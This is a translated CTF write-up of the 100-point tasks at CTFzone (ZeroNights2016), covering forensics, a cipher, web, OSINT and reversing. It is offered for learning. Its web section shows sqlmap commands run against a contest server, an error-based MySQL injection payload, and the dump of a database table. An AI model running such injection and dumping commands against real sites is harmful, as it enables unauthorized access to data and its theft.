<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>[ZeroNights2016] [CTFzone] Without 100 grams you will not understand</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="We continue the series of articles devoted to the WTA on CTFzone, which took place on November 17 and 18 within the framework of ZeroNights2016 under ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>[ZeroNights2016] [CTFzone] Without 100 grams you will not understand</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/a25/45e/3b0/a2545e3b056f48a1a133ae12207d5f90.jpg"><br><br>  We continue the series of articles devoted to the WTA on CTFzone, which took place on November 17 and 18 within the framework of ZeroNights2016 under the flag of Bi.Zone.  This time we will talk about tasks, the execution of which brought 100 points in favor of real hackers! <br><a name="habracut"></a><br><div class="spoiler">  <b class="spoiler_title">Previous publications from this cycle</b> <div class="spoiler_text">  <a href="https://habrahabr.ru/post/315876/">1) Debriefing for 50</a> <br></div></div><br>  Special thanks to <a href="https://habrahabr.ru/users/gh0st3rs/" class="user_link">GH0st3rs</a> for providing some of the assignments to the raytps. <br><br><h5>  <b>FORENSIC100 - Master of Strings</b> </h5><br><blockquote>  Rise and shine, stop dreaming of drinking and playing with the bear.  AURORA is not speaking at your workplace.  If you couldn‚Äôt go to the bottom of the world, you couldn‚Äôt ...  The man in the wrong place can change the world.  Find out what you want to do. </blockquote><br>  A 7z archive with the '.RAM' file was attached to the task.  Logically, it is necessary to analyze the cast of RAM.  It was decided to look in the direction of 'Volatility'.  Once again (two / three), after reading the assignment and scrolling through the Volatility Wiki, you could notice the ‚ÄúStrings‚Äù section and see the <a href="https://technet.microsoft.com/en-us/sysinternals/bb897439">link to SysInternals Strings</a> .  Of course, we use it: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre><code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">strings</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.exe</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">task_forensic_100</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.ram</span></span> &gt; <span class="hljs-selector-tag"><span class="hljs-selector-tag">output</span></span></code> </pre> <br>  We get output on ~ 70MB from UNICODE strings longer than 3 characters (by default).  Opening it with a text editor, I went in search of the flag, - "What if?".  What was my surprise: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/32d/23b/48b/32d23b48bb7b450fb6bf65e418e74e01.png"></div><br>  As it turned out later: my option to receive the flag was not the way the ‚Äúauthor‚Äù had planned it.  Well, well, maybe even better. <br><br><h5>  <b>MISC100 - Nerdy Mechanic</b> </h5><br><blockquote>  AURORA: Lieutenant, let me introduce you to Sergeant Varvara.  She needs your help. <br>  Sergeant Varvara: Lieutenant, this terminal is not working.  There is some gibberish on the screen.  This is a mechanic.  Would you take a look? </blockquote><br>  Below, we are provided with the same "curve" output from the terminal: <br><br><pre> <code class="bash hljs">why ir -iagp irbie -t cifap iw;-pfqlfrg -sfm DFG gukjlpi.cym/dnwalwbw pfrfg</code> </pre> <br>  What to do with it?  Let's take a closer look: the end of the fifth line is very similar to the link.  However, you need to replace: 'y' -&gt; 'o'.  Then in the first line, 'why' turns into 'who' - Aha!  - Obviously, this is the Bash interpreter.  Maybe in this task there was a certain logic of letter substitution, however, having scribbled a simple script in Python using the sample method, the solution came by itself: <br><br><pre> <code class="python hljs">print(text.replace(<span class="hljs-string"><span class="hljs-string">'y'</span></span>,<span class="hljs-string"><span class="hljs-string">'o'</span></span>).replace(<span class="hljs-string"><span class="hljs-string">'j'</span></span>,<span class="hljs-string"><span class="hljs-string">'y'</span></span>).replace(<span class="hljs-string"><span class="hljs-string">'n'</span></span>,<span class="hljs-string"><span class="hljs-string">'j'</span></span>).replace(<span class="hljs-string"><span class="hljs-string">'k'</span></span>,<span class="hljs-string"><span class="hljs-string">'n'</span></span>).replace(<span class="hljs-string"><span class="hljs-string">'u'</span></span>,<span class="hljs-string"><span class="hljs-string">'v'</span></span>).replace(<span class="hljs-string"><span class="hljs-string">'l'</span></span>,<span class="hljs-string"><span class="hljs-string">'u'</span></span>).replace(<span class="hljs-string"><span class="hljs-string">'i'</span></span>,<span class="hljs-string"><span class="hljs-string">'l'</span></span>).replace(<span class="hljs-string"><span class="hljs-string">'r'</span></span>,<span class="hljs-string"><span class="hljs-string">'s'</span></span>).replace(<span class="hljs-string"><span class="hljs-string">'e'</span></span>,<span class="hljs-string"><span class="hljs-string">'k'</span></span>).replace(<span class="hljs-string"><span class="hljs-string">'f'</span></span>,<span class="hljs-string"><span class="hljs-string">'e'</span></span>).replace(<span class="hljs-string"><span class="hljs-string">'p'</span></span>,<span class="hljs-string"><span class="hljs-string">'r'</span></span>).replace(<span class="hljs-string"><span class="hljs-string">'g'</span></span>,<span class="hljs-string"><span class="hljs-string">'t'</span></span>).replace(<span class="hljs-string"><span class="hljs-string">'G'</span></span>,<span class="hljs-string"><span class="hljs-string">'T'</span></span>).replace(<span class="hljs-string"><span class="hljs-string">';'</span></span>,<span class="hljs-string"><span class="hljs-string">'p'</span></span>).replace(<span class="hljs-string"><span class="hljs-string">'d'</span></span>,<span class="hljs-string"><span class="hljs-string">'g'</span></span>).replace(<span class="hljs-string"><span class="hljs-string">'D'</span></span>,<span class="hljs-string"><span class="hljs-string">'G'</span></span>).replace(<span class="hljs-string"><span class="hljs-string">'F'</span></span>,<span class="hljs-string"><span class="hljs-string">'E'</span></span>).replace(<span class="hljs-string"><span class="hljs-string">'v'</span></span>,<span class="hljs-string"><span class="hljs-string">'i'</span></span>))</code> </pre> <br>  The result was the following: <br><br><pre> <code class="bash hljs">who ls -latr lsblk -t clear lwp-request -sem GET tinyurl.com/gjwauwbw reset</code> </pre><br>  Follow the link and see the flag: ctfzone {182ac24a3b2dc86ba298f57d9c391c0b} <br><br>  PS&gt; From sources it became known that the original algorithm for replacing letters in a given ciphertext is the use of <a href="https://ru.wikipedia.org/wiki/Colemak">Colemak</a> . <br><br><h5>  <b>WEB100 - Search Engine</b> </h5><br><blockquote>  Lieutenant (You): AURORA, I'm in the SNT-47 compartment, in the general-purpose room.  Thermal signatures are missing.  I need to find out what I need? <br>  AURORA: AURORA Please name your identification number. <br>  You: What identification number ?!  Are you broken as well ??  I‚Äôm not sure to stay here forever ... </blockquote><br>  A reference to the site with the authorization form was attached to the task: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/f8f/007/130/f8f0071308b14261a9a7d6f1be53f2f4.png"></div><br><br>  Where to begin?  Correct: from the search by the source code of the page.  We go there and observe: <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">/static/js/pewpew.js</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"text/javascript"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  We open, we look: <br><br><pre> <code class="hljs scala"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-symbol"><span class="hljs-symbol">'s3cr3tuse</span></span>r' === $(ctrls[<span class="hljs-number"><span class="hljs-number">0</span></span>]).find(<span class="hljs-symbol"><span class="hljs-symbol">'inpu</span></span>t').<span class="hljs-keyword"><span class="hljs-keyword">val</span></span>() &amp;&amp; <span class="hljs-symbol"><span class="hljs-symbol">'v3rySTr0ngP</span></span><span class="hljs-meta"><span class="hljs-meta">@ss</span></span>' === $(ctrls[<span class="hljs-number"><span class="hljs-number">1</span></span>]).find(<span class="hljs-symbol"><span class="hljs-symbol">'inpu</span></span>t').<span class="hljs-keyword"><span class="hljs-keyword">val</span></span>()) {</code> </pre> <br>  With the naked eye, we understand what's what.  We return to the authorization form and go on.  Before us opens a page with a single search string.  ‚ÄúIsn't SQLi an hour here?‚Äù Should be heard in my head.  We go to check: bingo! <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/d51/82a/111/d5182a111cab4707a0ca04037293bd82.png"></div><br>  Well, we uncover the good old SqlMap (of course, it is possible with our hands).  Do not forget that we made the authorization =&gt; you need to specify cookies.  In order to save local space, the ‚Äúoutput‚Äù is not complete: <br><br><pre> <code class="bash hljs">root@hackzard:~<span class="hljs-comment"><span class="hljs-comment"># sqlmap -u "http://78.155.219.6/search/param1*" --cookie="session=eyJ1c2VybmFtZSI6InMzY3IzdHVzZXJzZkhXekRTd09WSVlQR0oifQ.Cw6t3A.obdrULM4zqHM6FlQcQh_uaPtgmg" --level=3 --dbms=MySQL --tables</span></span></code> </pre> <br><div class="spoiler">  <b class="spoiler_title">Command output</b> <div class="spoiler_text"> <code>Parameter: #1* (URI) <br> Type: error-based <br> Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) <br> Payload: http://78.155.219.6:80/search/param1'||(SELECT 'bGEm' FROM DUAL WHERE 8985=8985 AND (SELECT 1912 FROM(SELECT COUNT(*),CONCAT(0x7170716a71,(SELECT (ELT(1912=1912,1))),0x7176717a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||' <br> --- <br> [18:30:29] [INFO] testing MySQL <br> [18:30:29] [INFO] confirming MySQL <br> [18:30:29] [INFO] the back-end DBMS is MySQL <br> back-end DBMS: MySQL &gt;= 5.0.0 <br> [18:30:29] [INFO] fetching database names <br> [18:30:29] [INFO] the SQL query used returns 5 entries <br> [18:30:29] [INFO] resumed: information_schema <br> [18:30:29] [INFO] resumed: mysql <br> [18:30:29] [INFO] resumed: performance_schema <br> [18:30:29] [INFO] resumed: sqli_100 <br> [18:30:29] [INFO] resumed: sys <br> [18:30:29] [INFO] fetching tables for databases: 'information_schema, mysql, performance_schema, sqli_100, sys' <br> [18:30:29] [INFO] the SQL query used returns 282 entries</code> <br> </div></div><br><pre> <code class="bash hljs">root@hackzard:~<span class="hljs-comment"><span class="hljs-comment"># sqlmap -u "http://78.155.219.6/search/param1*" --cookie="session=eyJ1c2VybmFtZSI6InMzY3IzdHVzZXJzZkhXekRTd09WSVlQR0oifQ.Cw6t3A.obdrULM4zqHM6FlQcQh_uaPtgmg" --level=3 --dbms=MySQL -D "sqli_100" -T "wtf3thisiss3crettable_dont_read_dont_touch" --columns</span></span></code> </pre> <br><div class="spoiler">  <b class="spoiler_title">Command output</b> <div class="spoiler_text"> <code>Database: sqli_100 <br> Table: wtf3thisiss3crettable_dont_read_dont_touch <br> [2 columns] <br> +--------+--------------+ <br> | Column | Type | <br> +--------+--------------+ <br> | id | int(5) | <br> | secret | varchar(500) | <br> +--------+--------------+</code> <br> </div></div><br><pre> <code class="bash hljs">root@hackzard:~<span class="hljs-comment"><span class="hljs-comment"># sqlmap -u "http://78.155.219.6/search/param1*" --cookie="session=eyJ1c2VybmFtZSI6InMzY3IzdHVzZXJzZkhXekRTd09WSVlQR0oifQ.Cw6t3A.obdrULM4zqHM6FlQcQh_uaPtgmg" --level=3 --dbms=MySQL -D "sqli_100" -T "wtf3thisiss3crettable_dont_read_dont_touch" -C "secret" --dump</span></span></code> </pre> <br><div class="spoiler">  <b class="spoiler_title">Command output</b> <div class="spoiler_text"> <code>Database: sqli_100 <br> Table: wtf3thisiss3crettable_dont_read_dont_touch <br> [13 entries] <br> +-----------------------------------------+ <br> | secret | <br> +-----------------------------------------+ <br> | 089b1d5d37c22d81b55b6f77c9e2b042 | <br> | asdkkjhjsdaojewifdiowuefdw0 | <br> | asdkkjhjsdaojewifdiowuefdw0 | <br> | dskjhwjkfhsjdkfhsjdkhfjk | <br> | dskjhwjkfhsjdkfhsjdkhfjk | <br> | dskjhwjkfhsjdkfhsjdkhfjk | <br> | dskjhwjkfhsjdkfhsjdkhfjk | <br> | lfhdwrekfgbuhwoeijfdweoifjweoif | <br> | lfhdwrekfgbuhwoeijfdweoifjweoif | <br> | lfhdwrekfgbuhwoeijfdweoifjweoif | <br> | lfhdwrekfgbuhwoeijfdweoifjweoif | <br> | REMEMBER_FLAG_FORMAT.FLAG_IN_THIS_TABLE | <br> | REMEMBER_FLAG_FORMAT.FLAG_IN_THIS_TABLE | <br> +-----------------------------------------+</code> <br> </div></div><br>  We are asked not to forget the format of the flag, because it is in this table.  And here he is: <br><br>  ctfzone {089b1d5d37c22d81b55b6f77c9e2b042} <br><br><h5>  <b>OSINT100 - Weird Guy</b> </h5><br><blockquote>  AURORA: ZERONIGHTS 2016.  He was absorbed in reading something on his laptop.  We were not looking at the screen.  This photo might help you. </blockquote><br>  A picture was attached to the task: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/d07/704/e19/d07704e195944abc866ba8f453c6d726.jpg"></div><br>  In the photo we can observe how one person takes a picture of another, and also notice that the desired screen falls into the area of ‚Äã‚Äãthe photo.  The task is clear: you must find a photo from the right angle.  Given that this CTF is international in nature, we ask ourselves the question: ‚ÄúWhich site do we need?‚Äù.  Correct - Instagram.  Further, this task would have two solutions: <br><br><ul><li>  Realizing that the photography took place in the framework of ZeroNights2016 in the territory of the Cosmos Group of Companies - use the search by GeoTags.  Unfortunately, the moment refused to work, due to the uncertain changes in the Instagram API; </li><li>  Through trial and error, go through all the # hashtags that are somehow related to CTF, Bi.Zone or ZeroNights as a whole. </li></ul><br>  After some time (using the second method), the desired hashtag was found: # zn2016.  And here is the desired photo: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/000/c35/f00/000c35f00f8e4d21b8ddda9f58ce60d2.jpg"></div><br><br>  Flag: ctfzone {Os1nT_G4nGsT3r} <br><br><h5>  <b>REVERSE100 - The Doors Of Dorun</b> </h5><br><blockquote>  ** AURORA: ** Lieutenant, your co-pilot was abducted by prison.  They are out for free!  Doors couldn‚Äôt be seen. <br>  The inscription on the archivolt read: <br>  ‚ÄúThe Doors of Dorun, Lord of Omega.  Speak, friend, and enter.  I, Norvy, made them.  Calabrimbor of Alpha Centauri drew these signs. ‚Äù <br>  But be careful and hurry up.  They can be back any moment. </blockquote><br>  A file was attached to the task, when started, a window appeared with a field for entering a password.  If the password is incorrect, then an error occurred: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/8d6/395/505/8d6395505dfb4c669e064d2512b1c042.png"></div><br>  Well, well, turn it inside out!  Disassemble and re-see, already familiar to us from the past assignment (REVERSE50), function: DialogFunc, by offset: 13F7C1040.  Look further and find: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/2ba/fc6/cad/2bafc6cad6bd46f88c172e5917dbc297.png"></div><br>  At this section of the code, the entered password is received, and then passed to the function (let's call it: PassVerify), and in case of an incorrect result: <br><br> <code>jz short loc_13F7C1126</code> <br> <br>  takes us to a code section that signals an error: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/0e9/0c7/44a/0e90c744ae5743dfaa6b43a8128ec9e3.png"></div><br>  Let's go to the function: PassVerify and see what happens there.  We see a check of the length of the phrase we entered - 4 characters. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/f29/cfb/8c6/f29cfb8c6d594f63ad56839d8d411d21.png"></div><br>  Then, the password is divided into 2 parts of 2 characters: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/113/5db/c96/1135dbc969364659a0c9c78afadd412e.png"></div><br>  Next begins filling the stack with values ‚Äã‚Äãfor matching.  And, starting from the address: 13F7C1330, the verification of the entered password begins: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/89e/879/1e0/89e8791e0819430fb74c57aa1df84e29.png"></div><br>  Let's use the HexRays plugin and get this code: <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/374/597/67c/37459767c8fb4f99a134dbf76fbceb05.png"></div><br>  So what do we have?  In "v3" is the first part of the password, and in "v5" - the second.  If we convert this cycle, we get the following condition (Python): <br><br><pre> <code class="python hljs">v8 = [<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">241</span></span>, <span class="hljs-number"><span class="hljs-number">995</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">104</span></span>, <span class="hljs-number"><span class="hljs-number">413</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (v3%<span class="hljs-number"><span class="hljs-number">3</span></span>==v8[<span class="hljs-number"><span class="hljs-number">0</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> v3%<span class="hljs-number"><span class="hljs-number">5</span></span>==v8[<span class="hljs-number"><span class="hljs-number">1</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> v3%<span class="hljs-number"><span class="hljs-number">17</span></span>==v8[<span class="hljs-number"><span class="hljs-number">2</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> v3%<span class="hljs-number"><span class="hljs-number">257</span></span>==v8[<span class="hljs-number"><span class="hljs-number">3</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> v3%<span class="hljs-number"><span class="hljs-number">65537</span></span>==v8[<span class="hljs-number"><span class="hljs-number">4</span></span>]) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> (v5%<span class="hljs-number"><span class="hljs-number">3</span></span>==v8[<span class="hljs-number"><span class="hljs-number">6</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> v5%<span class="hljs-number"><span class="hljs-number">5</span></span>==v8[<span class="hljs-number"><span class="hljs-number">7</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> v5%<span class="hljs-number"><span class="hljs-number">17</span></span>==v8[<span class="hljs-number"><span class="hljs-number">8</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> v5%<span class="hljs-number"><span class="hljs-number">257</span></span>==v8[<span class="hljs-number"><span class="hljs-number">9</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> v5%<span class="hljs-number"><span class="hljs-number">65537</span></span>==v8[<span class="hljs-number"><span class="hljs-number">10</span></span>])</code> </pre> <br>  Everyone chose the solution to this equation for himself.  However, we are not looking for easy ways and we will use the Chinese theorem on residuals (the script of which remains from <a href="http://www.neoquest.ru/timeline.php%3Fyear%3D2016%26part%3D2">NeoQuest2016</a> ): <br><br><div class="spoiler">  <b class="spoiler_title">The Chinese remainder theorem.</b>  <b class="spoiler_title">Implementation: Python</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">chinese_remainder</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(n, a)</span></span></span><span class="hljs-function">:</span></span> sum = <span class="hljs-number"><span class="hljs-number">0</span></span> prod = reduce(<span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> a, b: a*b, n) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> n_i, a_i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> zip(n, a): p = prod / n_i sum += a_i * mul_inv(p, n_i) * p <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> sum % prod <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">mul_inv</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(a, b)</span></span></span><span class="hljs-function">:</span></span> b0 = b x0, x1 = <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> b == <span class="hljs-number"><span class="hljs-number">1</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> a &gt; <span class="hljs-number"><span class="hljs-number">1</span></span>: q = a / b a, b = b, a%b x0, x1 = x1 - q * x0, x0 <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> x1 &lt; <span class="hljs-number"><span class="hljs-number">0</span></span>: x1 += b0 <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> x1</code> </pre><br></div></div><br>  We use: <br><br><pre> <code class="python hljs">hex(chinese_remainder([<span class="hljs-number"><span class="hljs-number">3</span></span>,<span class="hljs-number"><span class="hljs-number">5</span></span>,<span class="hljs-number"><span class="hljs-number">17</span></span>,<span class="hljs-number"><span class="hljs-number">257</span></span>,<span class="hljs-number"><span class="hljs-number">65537</span></span>],[v8[<span class="hljs-number"><span class="hljs-number">0</span></span>],v8[<span class="hljs-number"><span class="hljs-number">1</span></span>],v8[<span class="hljs-number"><span class="hljs-number">2</span></span>],v8[<span class="hljs-number"><span class="hljs-number">3</span></span>],v8[<span class="hljs-number"><span class="hljs-number">4</span></span>]]))</code> </pre> <br>  Conclusion: 0xa028a40b <br><br>  We use: <br><br><pre> <code class="python hljs">hex(chinese_remainder([<span class="hljs-number"><span class="hljs-number">3</span></span>,<span class="hljs-number"><span class="hljs-number">5</span></span>,<span class="hljs-number"><span class="hljs-number">17</span></span>,<span class="hljs-number"><span class="hljs-number">257</span></span>,<span class="hljs-number"><span class="hljs-number">65537</span></span>],[v8[<span class="hljs-number"><span class="hljs-number">6</span></span>],v8[<span class="hljs-number"><span class="hljs-number">7</span></span>],v8[<span class="hljs-number"><span class="hljs-number">8</span></span>],v8[<span class="hljs-number"><span class="hljs-number">9</span></span>],v8[<span class="hljs-number"><span class="hljs-number">10</span></span>]]))</code> </pre> <br>  Output: 0xa288a425 <br><br>  We received character codes.  The next step is to visit <a href="http://unicode-table.com/ru">this site</a> and search for the corresponding characters by the known HEX values.  We get: ÍêãÍÄ®Íê•Íäà.  Try this password - Profit! <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/e0d/146/a3e/e0d146a3e46c4fa094196f2c46613efc.png"></div><br><br><hr><br>  We will continue this series of articles, where we consider the solutions of the remaining tasks of CTFzone 2016. <br>  Stay with us! </div><p>Source: <a href="https://habr.com/ru/post/315898/">https://habr.com/ru/post/315898/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../315888/index.html">The introduction of CRM without TZ: the road to nowhere</a></li>
<li><a href="../315890/index.html">About the importance of Java and where did hundreds of Architects jobs come from in Crossover</a></li>
<li><a href="../315892/index.html">About the vital in operation of the data center</a></li>
<li><a href="../315894/index.html">JSF is dead?</a></li>
<li><a href="../315896/index.html">Asset Operations: routine industrial documentation</a></li>
<li><a href="../315900/index.html">The difference of the frame from the library</a></li>
<li><a href="../315902/index.html">New season webinars Hewlett Packard Enterprise</a></li>
<li><a href="../315904/index.html">Meeting lovers of big data and art</a></li>
<li><a href="../315906/index.html">SPDK: Acceleration with NVMe Disks</a></li>
<li><a href="../315908/index.html">When is it harmful to test your components?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>